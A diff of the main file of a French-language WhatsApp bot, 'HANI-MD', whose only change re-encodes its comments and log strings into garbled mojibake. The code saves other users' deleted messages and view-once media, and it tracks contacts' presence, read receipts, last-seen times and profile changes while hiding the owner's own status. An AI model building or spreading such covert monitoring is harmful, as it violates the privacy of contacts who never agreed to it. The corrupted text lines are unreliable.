@@ -1,38 +1,38 @@
-/**
- * ╔═══════════════════════════════════════════════════════════╗
- * ║                    🌟 HANI-MD V2.6.0 🌟                   ║
- * ║          Bot WhatsApp Intelligent & Performant            ║
- * ║                   Créé par H2025                          ║
- * ║           🔒 SÉCURITÉ RENFORCÉE v2.0                      ║
- * ╚═══════════════════════════════════════════════════════════╝
+﻿/**
+ * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
+ * â•‘                    ðŸŒŸ HANI-MD V2.6.0 ðŸŒŸ                   â•‘
+ * â•‘          Bot WhatsApp Intelligent & Performant            â•‘
+ * â•‘                   CrÃ©Ã© par H2025                          â•‘
+ * â•‘           ðŸ”’ SÃ‰CURITÃ‰ RENFORCÃ‰E v2.0                      â•‘
+ * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  * 
  * Lancer avec: node hani.js
- * Scanne le QR code avec WhatsApp → Appareils connectés
+ * Scanne le QR code avec WhatsApp â†’ Appareils connectÃ©s
  * 
- * 🔄 BUILD: 2025-12-29T00:00:00Z - v2.6.0 - SÉCURITÉ RENFORCÉE
+ * ðŸ”„ BUILD: 2025-12-29T00:00:00Z - v2.6.0 - SÃ‰CURITÃ‰ RENFORCÃ‰E
  */
 
 const fs = require("fs");
 const path = require("path");
 const pino = require("pino");
 const qrcode = require("qrcode-terminal");
-const qrcodeWeb = require("qrcode"); // Pour générer QR en image web
+const qrcodeWeb = require("qrcode"); // Pour gÃ©nÃ©rer QR en image web
 const mysqlDB = require("./DataBase/mysql"); // MySQL pour persistance externe
-const premiumDB = require("./DataBase/premium"); // Système d'abonnement Premium
+const premiumDB = require("./DataBase/premium"); // SystÃ¨me d'abonnement Premium
 
-// 🔒 SYSTÈME DE CONTRÔLE D'ACCÈS
+// ðŸ”’ SYSTÃˆME DE CONTRÃ”LE D'ACCÃˆS
 let accessControl;
 try {
   accessControl = require("./lib/AccessControl");
-  console.log("[ACCESS] ✅ Système de contrôle d'accès chargé");
+  console.log("[ACCESS] âœ… SystÃ¨me de contrÃ´le d'accÃ¨s chargÃ©");
 } catch (e) {
-  console.log("[ACCESS] ⚠️ Système de contrôle d'accès non disponible:", e.message);
+  console.log("[ACCESS] âš ï¸ SystÃ¨me de contrÃ´le d'accÃ¨s non disponible:", e.message);
   accessControl = null;
 }
 
-// ═══════════════════════════════════════════════════════════
-// 📦 SYSTÈME DE COMMANDES MODULAIRES (OVLCMD)
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ“¦ SYSTÃˆME DE COMMANDES MODULAIRES (OVLCMD)
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 const { findCommand, executeCommand, getCommands, getCommandsByCategory } = require("./lib/ovlcmd");
 
@@ -69,21 +69,21 @@ for (const mod of commandModules) {
     require(mod);
     loadedModules++;
   } catch (e) {
-    console.log(`[CMD] ⚠️ Module ${mod} non chargé:`, e.message);
+    console.log(`[CMD] âš ï¸ Module ${mod} non chargÃ©:`, e.message);
   }
 }
-console.log(`[CMD] ✅ ${loadedModules}/${commandModules.length} modules de commandes chargés`);
-console.log(`[CMD] 📋 ${getCommands().length} commandes disponibles via ovlcmd`);
+console.log(`[CMD] âœ… ${loadedModules}/${commandModules.length} modules de commandes chargÃ©s`);
+console.log(`[CMD] ðŸ“‹ ${getCommands().length} commandes disponibles via ovlcmd`);
 
-// 🔒 MODULES DE SÉCURITÉ
+// ðŸ”’ MODULES DE SÃ‰CURITÃ‰
 let SecurityManager, SecureSessionManager;
 try {
   const security = require("./lib/security");
   SecurityManager = security.SecurityManager;
   SecureSessionManager = security.SecureSessionManager;
-  console.log("[SECURITY] ✅ Modules de sécurité chargés");
+  console.log("[SECURITY] âœ… Modules de sÃ©curitÃ© chargÃ©s");
 } catch (e) {
-  console.log("[SECURITY] ⚠️ Modules de sécurité non disponibles:", e.message);
+  console.log("[SECURITY] âš ï¸ Modules de sÃ©curitÃ© non disponibles:", e.message);
 }
 
 const {
@@ -97,28 +97,28 @@ const {
   getContentType,
 } = require("@whiskeysockets/baileys");
 
-// ═══════════════════════════════════════════════════════════
-// 📱 SYSTÈME QR CODE MULTI-UTILISATEURS
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ“± SYSTÃˆME QR CODE MULTI-UTILISATEURS
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-// État global pour le QR Code
+// Ã‰tat global pour le QR Code
 const qrState = {
   currentQR: null,           // QR code actuel (string)
   qrDataURL: null,           // QR code en base64 pour affichage web
-  lastUpdate: null,          // Timestamp de la dernière mise à jour
-  isConnected: false,        // État de connexion
+  lastUpdate: null,          // Timestamp de la derniÃ¨re mise Ã  jour
+  isConnected: false,        // Ã‰tat de connexion
   connectionStatus: "disconnected", // disconnected, waiting_qr, connecting, connected
-  botInfo: null,             // Infos du bot connecté
-  qrCount: 0,                // Nombre de QR générés
+  botInfo: null,             // Infos du bot connectÃ©
+  qrCount: 0,                // Nombre de QR gÃ©nÃ©rÃ©s
 };
 
-// ═══════════════════════════════════════════════════════════
-// 📦 BASE DE DONNÉES MYSQL UNIQUEMENT
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ“¦ BASE DE DONNÃ‰ES MYSQL UNIQUEMENT
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 class HaniDatabase {
   constructor() {
-    // Données en cache mémoire pour performance
+    // DonnÃ©es en cache mÃ©moire pour performance
     this.data = {
       users: {},
       groups: {},
@@ -141,12 +141,12 @@ class HaniDatabase {
       const connected = await mysqlDB.connect();
       if (connected) {
         this.mysqlConnected = true;
-        console.log("[OK] MySQL connecté - Stockage en ligne uniquement");
+        console.log("[OK] MySQL connectÃ© - Stockage en ligne uniquement");
         
-        // Charger les données depuis MySQL
+        // Charger les donnÃ©es depuis MySQL
         await this.loadFromMySQL();
       } else {
-        console.error("[ERREUR CRITIQUE] MySQL non connecté - Le bot ne peut pas fonctionner!");
+        console.error("[ERREUR CRITIQUE] MySQL non connectÃ© - Le bot ne peut pas fonctionner!");
       }
     } catch (e) {
       console.error("[ERREUR CRITIQUE] MySQL non disponible:", e.message);
@@ -178,9 +178,9 @@ class HaniDatabase {
         this.data.banned = banned.map(b => b.jid || b);
       }
       
-      console.log("[STATS] Données MySQL chargées");
+      console.log("[STATS] DonnÃ©es MySQL chargÃ©es");
     } catch (e) {
-      console.log("[!] Erreur chargement données MySQL:", e.message);
+      console.log("[!] Erreur chargement donnÃ©es MySQL:", e.message);
     }
   }
 
@@ -210,7 +210,7 @@ class HaniDatabase {
       }
     } catch (e) {}
     
-    // Créer si n'existe pas
+    // CrÃ©er si n'existe pas
     if (!this.data.users[jid]) {
       this.data.users[jid] = { 
         jid,
@@ -336,7 +336,7 @@ class HaniDatabase {
 
   async ban(jid) {
     try {
-      await mysqlDB.banUser(jid, "Banni par le système");
+      await mysqlDB.banUser(jid, "Banni par le systÃ¨me");
       if (!this.data.banned.includes(jid)) {
         this.data.banned.push(jid);
       }
@@ -390,7 +390,7 @@ class HaniDatabase {
     this.save();
   }
 
-  // Approved Users (utilisateurs approuvés avec accès limité)
+  // Approved Users (utilisateurs approuvÃ©s avec accÃ¨s limitÃ©)
   isApproved(jid) {
     if (!this.data.approved) this.data.approved = [];
     return this.data.approved.includes(jid) || this.data.approved.some(n => jid.includes(n));
@@ -430,7 +430,7 @@ class HaniDatabase {
 
   // === FONCTIONS MySQL ===
 
-  // Sauvegarder un message supprimé
+  // Sauvegarder un message supprimÃ©
   async saveDeletedMessage(message, from, sender, senderName = '', groupName = null) {
     try {
       let mediaType = null;
@@ -450,11 +450,11 @@ class HaniDatabase {
         mediaType
       });
     } catch (e) {
-      console.log("[!] Erreur sauvegarde message supprimé:", e.message);
+      console.log("[!] Erreur sauvegarde message supprimÃ©:", e.message);
     }
   }
 
-  // Récupérer les messages supprimés
+  // RÃ©cupÃ©rer les messages supprimÃ©s
   async getDeletedMessages(jid = null, limit = 20) {
     try {
       return await mysqlDB.getDeletedMessages(jid, limit);
@@ -463,16 +463,16 @@ class HaniDatabase {
     }
   }
 
-  // Sauvegarder un statut supprimé
+  // Sauvegarder un statut supprimÃ©
   async saveDeletedStatus(statusData) {
     try {
       await mysqlDB.saveDeletedStatus(statusData);
     } catch (e) {
-      console.log("[!] Erreur sauvegarde statut supprimé:", e.message);
+      console.log("[!] Erreur sauvegarde statut supprimÃ©:", e.message);
     }
   }
 
-  // Récupérer les statuts supprimés
+  // RÃ©cupÃ©rer les statuts supprimÃ©s
   async getDeletedStatuses(sender = null, limit = 20) {
     try {
       return await mysqlDB.getDeletedStatuses(sender, limit);
@@ -557,9 +557,9 @@ class HaniDatabase {
   }
 }
 
-// ═══════════════════════════════════════════════════════════
-// ⚙️ CONFIGURATION
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// âš™ï¸ CONFIGURATION
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 require("dotenv").config({ override: true });
 
@@ -572,13 +572,13 @@ const config = {
   MODE: process.env.MODE || "public",
   STICKER_PACK: "HANI-MD",
   STICKER_AUTHOR: "H2025",
-  SESSION_ID: process.env.SESSION_ID || "",  // Session encodée pour déploiement
+  SESSION_ID: process.env.SESSION_ID || "",  // Session encodÃ©e pour dÃ©ploiement
 };
 
 const SESSION_FOLDER = "./DataBase/session/principale";
 const db = new HaniDatabase();
 
-// 🔒 Initialiser le gestionnaire de sécurité
+// ðŸ”’ Initialiser le gestionnaire de sÃ©curitÃ©
 let securityManager = null;
 if (SecurityManager) {
   securityManager = new SecurityManager({
@@ -587,13 +587,13 @@ if (SecurityManager) {
     enableSecureSession: true
   });
   securityManager.initialize().catch(e => 
-    console.log("[SECURITY] ⚠️ Erreur init:", e.message)
+    console.log("[SECURITY] âš ï¸ Erreur init:", e.message)
   );
 }
 
-// ═══════════════════════════════════════════════════════════
-// 🔐 RESTAURATION DE SESSION DEPUIS SESSION_ID (SÉCURISÉ)
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ” RESTAURATION DE SESSION DEPUIS SESSION_ID (SÃ‰CURISÃ‰)
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 async function restoreSessionFromId() {
   const sessionId = config.SESSION_ID;
@@ -603,95 +603,95 @@ async function restoreSessionFromId() {
     return false;
   }
   
-  // Vérifier le format (V1 ou V2)
+  // VÃ©rifier le format (V1 ou V2)
   const isV2 = sessionId.startsWith("HANI-MD-V2~");
   const isV1 = sessionId.startsWith("HANI-MD~");
   
   if (!isV1 && !isV2) {
-    console.log("[SESSION] ⚠️ Format SESSION_ID non reconnu");
+    console.log("[SESSION] âš ï¸ Format SESSION_ID non reconnu");
     return false;
   }
   
   try {
-    console.log(`🔐 Restauration de session (format ${isV2 ? 'V2 sécurisé' : 'V1 legacy'})...`);
+    console.log(`ðŸ” Restauration de session (format ${isV2 ? 'V2 sÃ©curisÃ©' : 'V1 legacy'})...`);
     
-    // Utiliser le gestionnaire de sécurité si disponible pour V2
+    // Utiliser le gestionnaire de sÃ©curitÃ© si disponible pour V2
     if (isV2 && securityManager && securityManager.sessionManager) {
       const result = await securityManager.restoreSession(sessionId);
       if (result.success) {
-        console.log(`[OK] Session V2 restaurée ! Bot: ${result.botNumber || 'inconnu'}`);
+        console.log(`[OK] Session V2 restaurÃ©e ! Bot: ${result.botNumber || 'inconnu'}`);
         return true;
       }
-      console.log("[SESSION] ⚠️ Fallback vers méthode legacy...");
+      console.log("[SESSION] âš ï¸ Fallback vers mÃ©thode legacy...");
     }
     
-    // Méthode legacy (V1) ou fallback
+    // MÃ©thode legacy (V1) ou fallback
     const base64Data = sessionId.replace("HANI-MD-V2~", "").replace("HANI-MD~", "");
     const jsonString = Buffer.from(base64Data, "base64").toString("utf-8");
     const sessionBundle = JSON.parse(jsonString);
     
-    // Créer le dossier si nécessaire
+    // CrÃ©er le dossier si nÃ©cessaire
     if (!fs.existsSync(SESSION_FOLDER)) {
       fs.mkdirSync(SESSION_FOLDER, { recursive: true });
     }
     
-    // Écrire les fichiers de session
+    // Ã‰crire les fichiers de session
     for (const [filename, base64Content] of Object.entries(sessionBundle)) {
       const filePath = path.join(SESSION_FOLDER, filename);
       const content = Buffer.from(base64Content, "base64");
       fs.writeFileSync(filePath, content);
     }
     
-    console.log("[OK] Session restaurée avec succès !");
+    console.log("[OK] Session restaurÃ©e avec succÃ¨s !");
     return true;
   } catch (e) {
-    console.error("❌ Erreur restauration session:", e.message);
+    console.error("âŒ Erreur restauration session:", e.message);
     return false;
   }
 }
 
-// ═══════════════════════════════════════════════════════════
-// 🛡️ ÉTATS DES PROTECTIONS (GLOBAL) - TOUT ACTIVÉ AUTOMATIQUEMENT
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ›¡ï¸ Ã‰TATS DES PROTECTIONS (GLOBAL) - TOUT ACTIVÃ‰ AUTOMATIQUEMENT
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 const protectionState = {
-  antidelete: true,           // Messages supprimés → envoyés à Moi-même
+  antidelete: true,           // Messages supprimÃ©s â†’ envoyÃ©s Ã  Moi-mÃªme
   anticall: false,            // Rejeter les appels (actif seulement si mode invisible)
-  antideletestatus: true,     // Statuts supprimés → envoyés à Moi-même
-  autoViewOnce: true,         // Photos/Vidéos vue unique → envoyées à Moi-même
-  autoViewOnceAudio: true,    // Vocaux écoute unique → envoyés à Moi-même
-  autoSaveStatus: true,       // Tous les statuts → sauvegardés automatiquement
-  // antibot désactivé - plus de blocage automatique des bots
-  spyStatusViews: true,       // 👁️ Voir qui regarde mes statuts (même si désactivé)
-  spyReadReceipts: true,      // 📖 Notifications lecture messages ACTIVÉ
-  spyReplies: true,           // 🔔 Notifier quand quelqu'un répond (preuve de lecture!)
-  spyPresence: true,          // 👀 Détecter qui ouvre ma discussion (en ligne/tape)
-  // 🆕 NOUVELLES FONCTIONNALITÉS
-  autoSendViewOnce: true,     // 📸 Envoyer automatiquement viewonce quand je réponds à quelqu'un
+  antideletestatus: true,     // Statuts supprimÃ©s â†’ envoyÃ©s Ã  Moi-mÃªme
+  autoViewOnce: true,         // Photos/VidÃ©os vue unique â†’ envoyÃ©es Ã  Moi-mÃªme
+  autoViewOnceAudio: true,    // Vocaux Ã©coute unique â†’ envoyÃ©s Ã  Moi-mÃªme
+  autoSaveStatus: true,       // Tous les statuts â†’ sauvegardÃ©s automatiquement
+  // antibot dÃ©sactivÃ© - plus de blocage automatique des bots
+  spyStatusViews: true,       // ðŸ‘ï¸ Voir qui regarde mes statuts (mÃªme si dÃ©sactivÃ©)
+  spyReadReceipts: true,      // ðŸ“– Notifications lecture messages ACTIVÃ‰
+  spyReplies: true,           // ðŸ”” Notifier quand quelqu'un rÃ©pond (preuve de lecture!)
+  spyPresence: true,          // ðŸ‘€ DÃ©tecter qui ouvre ma discussion (en ligne/tape)
+  // ðŸ†• NOUVELLES FONCTIONNALITÃ‰S
+  autoSendViewOnce: true,     // ðŸ“¸ Envoyer automatiquement viewonce quand je rÃ©ponds Ã  quelqu'un
 };
 
-// ═══════════════════════════════════════════════════════════
-// 📱 NUMÉRO POUR RECEVOIR TOUTES LES NOTIFICATIONS
-// ═══════════════════════════════════════════════════════════
-// Utilise la variable d'environnement, sinon le numéro du bot sera utilisé
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ“± NUMÃ‰RO POUR RECEVOIR TOUTES LES NOTIFICATIONS
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// Utilise la variable d'environnement, sinon le numÃ©ro du bot sera utilisÃ©
 const NOTIFICATION_NUMBER = process.env.NOTIFICATION_NUMBER 
   ? `${process.env.NOTIFICATION_NUMBER.replace(/[^0-9]/g, '')}@s.whatsapp.net`
-  : null; // null = sera défini dynamiquement avec le numéro du bot
+  : null; // null = sera dÃ©fini dynamiquement avec le numÃ©ro du bot
 
-// 📸 Stockage des ViewOnce reçus par contact (pour envoi auto)
+// ðŸ“¸ Stockage des ViewOnce reÃ§us par contact (pour envoi auto)
 const pendingViewOnce = new Map(); // { senderJid: { media, mediaType, caption, timestamp } }
 
 // Stockage des vues de statuts et lectures
 const spyData = {
   statusViews: [],      // { viewer, viewerName, timestamp }
   messageReads: [],     // { reader, readerName, timestamp }
-  replies: [],          // { replier, replierName, timestamp, preview } - Réponses reçues
-  pendingMessages: {},  // Messages envoyés en attente de lecture { jid: timestamp }
-  presenceDetected: [], // { jid, name, type, timestamp } - Présences détectées
-  lastPresenceNotif: {}, // Anti-spam: dernière notification par JID
+  replies: [],          // { replier, replierName, timestamp, preview } - RÃ©ponses reÃ§ues
+  pendingMessages: {},  // Messages envoyÃ©s en attente de lecture { jid: timestamp }
+  presenceDetected: [], // { jid, name, type, timestamp } - PrÃ©sences dÃ©tectÃ©es
+  lastPresenceNotif: {}, // Anti-spam: derniÃ¨re notification par JID
   maxEntries: 100,       // Garder les 100 derniers
-  presenceCooldown: {},  // Cooldown pour éviter spam
-  // 🆕 Nouvelles données espion avancées
+  presenceCooldown: {},  // Cooldown pour Ã©viter spam
+  // ðŸ†• Nouvelles donnÃ©es espion avancÃ©es
   lastSeen: {},          // { jid: { lastOnline, lastOffline, name } } - Tracker connexion
   profileChanges: [],    // { jid, type: 'photo'|'bio'|'name', oldValue, newValue, timestamp }
   profileSnapshots: {},  // { jid: { photo, bio, name, lastCheck } } - Snapshots profils
@@ -699,30 +699,30 @@ const spyData = {
   groupActivity: [],     // { groupJid, groupName, action, participant, participantName, timestamp }
 };
 
-// 🆕 Configuration espion avancé
+// ðŸ†• Configuration espion avancÃ©
 const spyConfig = {
-  trackLastSeen: true,      // Tracker les connexions/déconnexions
+  trackLastSeen: true,      // Tracker les connexions/dÃ©connexions
   alertPhotoChange: true,   // Alerter si photo de profil change
   alertBioChange: true,     // Alerter si bio change
   alertNameChange: true,    // Alerter si nom change
   trackCalls: true,         // Historique des appels
-  trackGroups: false,       // Surveillance des groupes (DÉSACTIVÉ)
-  ghostMode: false,         // Mode fantôme (invisible total)
+  trackGroups: false,       // Surveillance des groupes (DÃ‰SACTIVÃ‰)
+  ghostMode: false,         // Mode fantÃ´me (invisible total)
   ghostModeAdvanced: {
     hideOnline: true,       // Ne pas montrer "en ligne"
-    hideTyping: true,       // Ne pas montrer "en train d'écrire"
+    hideTyping: true,       // Ne pas montrer "en train d'Ã©crire"
     hideRead: true,         // Ne pas envoyer les confirmations de lecture
     hideRecording: true,    // Ne pas montrer "enregistre un vocal"
   }
 };
 
-// 📅 MESSAGES PROGRAMMÉS (Scheduled Messages)
+// ðŸ“… MESSAGES PROGRAMMÃ‰S (Scheduled Messages)
 const scheduledMessages = [];
 // Structure: { id, targetJid, targetName, message, scheduledTime, repeat, repeatInterval, active, createdAt }
 // repeat: 'once' | 'daily' | 'weekly' | 'monthly'
-// repeatInterval: pour personnalisé (en ms)
+// repeatInterval: pour personnalisÃ© (en ms)
 
-// 📸 STATUTS PROGRAMMÉS (Scheduled Status/Stories)
+// ðŸ“¸ STATUTS PROGRAMMÃ‰S (Scheduled Status/Stories)
 const scheduledStatus = [];
 // Structure: { id, type: 'text'|'image'|'video', content, caption, scheduledTime, repeat, active, createdAt }
 // content: texte pour type 'text', URL/buffer pour 'image'/'video'
@@ -730,19 +730,19 @@ const scheduledStatus = [];
 let schedulerInterval = null;
 let ghostModeInterval = null; // Intervalle pour maintenir le mode ghost
 
-// 👻 Fonction pour démarrer le mode ghost (maintenir invisible en continu)
+// ðŸ‘» Fonction pour dÃ©marrer le mode ghost (maintenir invisible en continu)
 function startGhostMode(hani) {
-  if (ghostModeInterval) return; // Déjà actif
+  if (ghostModeInterval) return; // DÃ©jÃ  actif
   
-  // Envoyer immédiatement la présence "unavailable"
+  // Envoyer immÃ©diatement la prÃ©sence "unavailable"
   try {
     hani.sendPresenceUpdate("unavailable");
-    console.log("👻 [GHOST] Mode fantôme activé - Présence invisible");
+    console.log("ðŸ‘» [GHOST] Mode fantÃ´me activÃ© - PrÃ©sence invisible");
   } catch (e) {
-    console.log("👻 [GHOST] Erreur activation:", e.message);
+    console.log("ðŸ‘» [GHOST] Erreur activation:", e.message);
   }
   
-  // Maintenir la présence invisible toutes les 10 secondes
+  // Maintenir la prÃ©sence invisible toutes les 10 secondes
   ghostModeInterval = setInterval(async () => {
     if (!spyConfig.ghostMode) {
       stopGhostMode();
@@ -756,12 +756,12 @@ function startGhostMode(hani) {
   }, 10000); // Toutes les 10 secondes
 }
 
-// 👻 Fonction pour arrêter le mode ghost
+// ðŸ‘» Fonction pour arrÃªter le mode ghost
 function stopGhostMode(hani) {
   if (ghostModeInterval) {
     clearInterval(ghostModeInterval);
     ghostModeInterval = null;
-    console.log("👻 [GHOST] Mode fantôme désactivé");
+    console.log("ðŸ‘» [GHOST] Mode fantÃ´me dÃ©sactivÃ©");
   }
   // Remettre visible si hani est fourni
   if (hani) {
@@ -771,32 +771,32 @@ function stopGhostMode(hani) {
   }
 }
 
-// Fonction pour vérifier et envoyer les messages programmés
+// Fonction pour vÃ©rifier et envoyer les messages programmÃ©s
 function startScheduler(hani) {
-  if (schedulerInterval) return; // Déjà démarré
+  if (schedulerInterval) return; // DÃ©jÃ  dÃ©marrÃ©
   
   schedulerInterval = setInterval(async () => {
     const now = Date.now();
     const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
     
-    // ═══════════ MESSAGES PROGRAMMÉS ═══════════
+    // â•â•â•â•â•â•â•â•â•â•â• MESSAGES PROGRAMMÃ‰S â•â•â•â•â•â•â•â•â•â•â•
     for (const msg of scheduledMessages) {
       if (!msg.active) continue;
       
-      // Vérifier si c'est l'heure
+      // VÃ©rifier si c'est l'heure
       if (now >= msg.scheduledTime) {
         try {
           // Envoyer le message
           await hani.sendMessage(msg.targetJid, { text: msg.message });
           
-          console.log(`📅 [SCHEDULED] Message envoyé à ${msg.targetName}: "${msg.message.slice(0, 50)}..."`);
+          console.log(`ðŸ“… [SCHEDULED] Message envoyÃ© Ã  ${msg.targetName}: "${msg.message.slice(0, 50)}..."`);
           
           // Notifier l'owner
           await hani.sendMessage(botNumber, { 
-            text: `📅 *Message programmé envoyé*\n\n👤 À: ${msg.targetName}\n📱 ${msg.targetJid.split("@")[0]}\n💬 "${msg.message.slice(0, 100)}..."\n🕐 ${new Date().toLocaleString("fr-FR")}`
+            text: `ðŸ“… *Message programmÃ© envoyÃ©*\n\nðŸ‘¤ Ã€: ${msg.targetName}\nðŸ“± ${msg.targetJid.split("@")[0]}\nðŸ’¬ "${msg.message.slice(0, 100)}..."\nðŸ• ${new Date().toLocaleString("fr-FR")}`
           });
           
-          // Gérer la répétition
+          // GÃ©rer la rÃ©pÃ©tition
           if (msg.repeat === 'once') {
             msg.active = false;
           } else if (msg.repeat === 'daily') {
@@ -809,12 +809,12 @@ function startScheduler(hani) {
             msg.scheduledTime += msg.repeatInterval;
           }
         } catch (e) {
-          console.log(`[!] Erreur envoi message programmé: ${e.message}`);
+          console.log(`[!] Erreur envoi message programmÃ©: ${e.message}`);
         }
       }
     }
     
-    // ═══════════ STATUTS PROGRAMMÉS ═══════════
+    // â•â•â•â•â•â•â•â•â•â•â• STATUTS PROGRAMMÃ‰S â•â•â•â•â•â•â•â•â•â•â•
     for (const status of scheduledStatus) {
       if (!status.active) continue;
       
@@ -839,7 +839,7 @@ function startScheduler(hani) {
             }, { statusJidList: status.audience || [] });
             
           } else if (status.type === 'video') {
-            // Statut vidéo
+            // Statut vidÃ©o
             const videoBuffer = status.mediaBuffer || (await fetch(status.content).then(r => r.buffer()));
             await hani.sendMessage(statusJid, {
               video: videoBuffer,
@@ -847,14 +847,14 @@ function startScheduler(hani) {
             }, { statusJidList: status.audience || [] });
           }
           
-          console.log(`📸 [STATUS] Statut ${status.type} publié: "${(status.caption || status.content).slice(0, 30)}..."`);
+          console.log(`ðŸ“¸ [STATUS] Statut ${status.type} publiÃ©: "${(status.caption || status.content).slice(0, 30)}..."`);
           
           // Notifier l'owner
           await hani.sendMessage(botNumber, { 
-            text: `📸 *Statut programmé publié!*\n\n📝 Type: ${status.type}\n💬 ${status.type === 'text' ? status.content.slice(0, 100) : status.caption || 'Sans légende'}\n🕐 ${new Date().toLocaleString("fr-FR")}`
+            text: `ðŸ“¸ *Statut programmÃ© publiÃ©!*\n\nðŸ“ Type: ${status.type}\nðŸ’¬ ${status.type === 'text' ? status.content.slice(0, 100) : status.caption || 'Sans lÃ©gende'}\nðŸ• ${new Date().toLocaleString("fr-FR")}`
           });
           
-          // Gérer la répétition
+          // GÃ©rer la rÃ©pÃ©tition
           if (status.repeat === 'once') {
             status.active = false;
           } else if (status.repeat === 'daily') {
@@ -865,53 +865,53 @@ function startScheduler(hani) {
         } catch (e) {
           console.log(`[!] Erreur publication statut: ${e.message}`);
           await hani.sendMessage(botNumber, { 
-            text: `❌ *Erreur statut programmé*\n\n${e.message}`
+            text: `âŒ *Erreur statut programmÃ©*\n\n${e.message}`
           });
         }
       }
     }
     
-  }, 30000); // Vérifier toutes les 30 secondes
+  }, 30000); // VÃ©rifier toutes les 30 secondes
   
-  console.log("📅 [SCHEDULER] Système de messages/statuts programmés démarré");
+  console.log("ðŸ“… [SCHEDULER] SystÃ¨me de messages/statuts programmÃ©s dÃ©marrÃ©");
 }
 
-// 📇 FONCTION pour détecter si c'est un LID (Linked ID) et pas un vrai numéro
+// ðŸ“‡ FONCTION pour dÃ©tecter si c'est un LID (Linked ID) et pas un vrai numÃ©ro
 const isLID = (number) => {
-  if (!number) return false; // Si pas de numéro, laisser passer
+  if (!number) return false; // Si pas de numÃ©ro, laisser passer
   const str = String(number);
   // Si c'est un JID avec @lid, c'est un LID
   if (str.includes("@lid")) return true;
   // Extraire uniquement les chiffres
   const clean = str.replace(/[^0-9]/g, '');
-  // Les LID sont généralement très longs (> 13 chiffres)
-  // Les vrais numéros ont généralement 8-13 chiffres
+  // Les LID sont gÃ©nÃ©ralement trÃ¨s longs (> 13 chiffres)
+  // Les vrais numÃ©ros ont gÃ©nÃ©ralement 8-13 chiffres
   if (clean.length > 13) return true;
   return false;
 };
 
-// 📇 FONCTION pour extraire un vrai numéro depuis un JID
+// ðŸ“‡ FONCTION pour extraire un vrai numÃ©ro depuis un JID
 const extractRealNumber = (jid) => {
   if (!jid) return null;
-  // Si c'est un LID, on ne peut pas avoir le vrai numéro
+  // Si c'est un LID, on ne peut pas avoir le vrai numÃ©ro
   if (String(jid).includes("@lid")) return null;
-  // Extraire le numéro avant @s.whatsapp.net
+  // Extraire le numÃ©ro avant @s.whatsapp.net
